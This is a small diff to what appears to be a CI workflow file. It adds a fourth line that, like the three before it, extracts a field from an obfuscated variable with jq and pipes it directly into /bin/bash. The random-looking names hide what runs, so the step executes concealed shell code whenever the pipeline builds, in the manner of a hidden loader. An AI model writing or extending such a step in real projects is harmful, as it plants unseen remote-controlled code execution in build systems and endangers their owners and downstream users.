@@ -28,6 +28,7 @@ jobs:
           echo $tgl04 | jq -r .t0 | /bin/bash
           printf '%s' "$rdl88" | jq -r .mwtmg78515 | /bin/bash
           echo $emrnz96854 | jq -r .xxrhn88488 | /bin/bash
+          printf '%s' "$hvep3627" | jq -r .hlut55139 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
